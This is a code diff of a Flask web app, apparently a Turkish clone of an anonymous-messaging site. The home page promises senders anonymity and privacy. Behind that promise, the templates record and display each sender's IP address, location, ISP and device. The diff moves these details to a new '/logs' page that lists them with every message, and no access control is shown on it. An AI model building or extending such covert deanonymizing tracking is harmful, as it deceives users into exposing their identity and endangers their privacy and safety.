@@ -40,18 +40,18 @@ HOME_HTML = """
 </head>
 <body>
     {% if success %}
-        <div class="success">✅ Mesajın gönderildi!</div>
+        <div class="success">Mesajın gönderildi!✅</div>
         <p>gizlilik esastır.</p>
     {% else %}
-        <h1>@{{ username if username else 'NGL Anonim' }}</h1>
+        <h1>@{{ username if username else 'itiraf_ipal' }}</h1>
         <p>Anonim mesaj gönder</p>
         <form method="POST">
             <input type="text" name="username" placeholder="Kullanıcı adın (isteğe bağlı)" value="{{ username }}" autocomplete="off"><br>
             <textarea name="message" placeholder="Buraya yaz..." required></textarea><br>
             <button type="submit">Gönder</button>
         </form>
-        <div class="info">Kullanıcı adı boş bırakılırsa anonim kalır</div>
-        <div class="footer">Bu site itiraf_ipal tarafından yapılmıştır</div>
+        <div class="info">http://instagram.com/itiraf_ipal</div>
+        <div class="footer">Bu site itiraf_ipal tarafından yapılmıştır tüm hakları saklıdır©</div>
     {% endif %}
 </body>
 </html>
@@ -67,7 +67,7 @@ MESAJLAR_HTML = """
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
     <style>
         body {
-            background: linear-gradient(135deg, #0f001a, #1a0033, #2a004d);
+            background: linear-gradient(135deg, #0f001a, #1a0033, #2a004d, #4b0082);
             color: white;
             font-family: 'Helvetica Neue', Arial, sans-serif;
             margin: 0;
@@ -135,16 +135,6 @@ MESAJLAR_HTML = """
             line-height: 1.6;
             text-align: center;
         }
-        .log-details {
-            font-size: 0.9rem;
-            opacity: 0.8;
-            text-align: left;
-            margin-top: 20px;
-            padding: 10px;
-            background: rgba(0,0,0,0.4);
-            border-radius: 8px;
-            width: 90%;
-        }
         .footer {
             font-size: 1.1rem;
             opacity: 0.9;
@@ -189,14 +179,7 @@ MESAJLAR_HTML = """
                         <div class="username">@{{ msg.username or 'Anonim' }}</div>
                         <div class="message">{{ msg.message }}</div>
                     </div>
-                    <div class="log-details">
-                        <strong>IP:</strong> {{ msg.ip or 'Bilinmiyor' }} <br>
-                        <strong>Konum:</strong> {{ msg.location or 'Bilinmiyor' }} <br>
-                        <strong>ISP:</strong> {{ msg.isp or 'Bilinmiyor' }} <br>
-                        <strong>Cihaz:</strong> {{ msg.user_agent[:80] or 'Bilinmiyor' }}... <br>
-                        <strong>Zaman:</strong> {{ msg.timestamp }}
-                    </div>
-                    <div class="footer">sent with ♥ from team NGL</div>
+                    <div class="footer">@itiraf_ipal</div>
                     <div class="admin-footer">@ipal_itiraf</div>
                     <button class="download-btn" onclick="downloadBox('msg-box-{{ loop.index }}')">Story'ye Kaydet (İndir)</button>
                 </div>
@@ -238,6 +221,71 @@ MESAJLAR_HTML = """
             });
         }
     </script>
+</body>
+</html>
+"""
+
+LOGS_HTML = """
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>itiraf_ipal - Loglar</title>
+    <style>
+        body {
+            background: linear-gradient(135deg, #000000, #1a0033);
+            color: white;
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        h1 {
+            text-align: center;
+            font-size: 2.5rem;
+            margin: 40px 0 30px;
+            background: linear-gradient(90deg, #ff00cc, #00ffff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        .log-entry {
+            background: rgba(0,0,0,0.4);
+            border-radius: 12px;
+            padding: 15px;
+            margin-bottom: 15px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .log-title {
+            font-size: 1.2rem;
+            font-weight: bold;
+            margin-bottom: 10px;
+            color: #ff00cc;
+        }
+        .log-detail {
+            font-size: 1rem;
+            margin-bottom: 5px;
+        }
+    </style>
+</head>
+<body>
+    <h1>Log Detayları</h1>
+    {% if messages %}
+        {% for msg in messages %}
+            <div class="log-entry">
+                <div class="log-title">@{{ msg.username or 'Anonim' }} - {{ msg.timestamp }}</div>
+                <div class="log-detail"><strong>Mesaj:</strong> {{ msg.message }}</div>
+                <div class="log-detail"><strong>IP:</strong> {{ msg.ip or 'Bilinmiyor' }}</div>
+                <div class="log-detail"><strong>Konum:</strong> {{ msg.location or 'Bilinmiyor' }}</div>
+                <div class="log-detail"><strong>ISP:</strong> {{ msg.isp or 'Bilinmiyor' }}</div>
+                <div class="log-detail"><strong>Cihaz:</strong> {{ msg.user_agent[:100] or 'Bilinmiyor' }}...</div>
+            </div>
+        {% endfor %}
+    {% else %}
+        <p>Henüz log yok.</p>
+    {% endif %}
 </body>
 </html>
 """
@@ -299,6 +347,10 @@ def home():
 @app.route('/mesajlar')
 def mesajlar():
     return render_template_string(MESAJLAR_HTML, messages=messages)
+
+@app.route('/logs')
+def logs():
+    return render_template_string(LOGS_HTML, messages=messages)
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 5000))
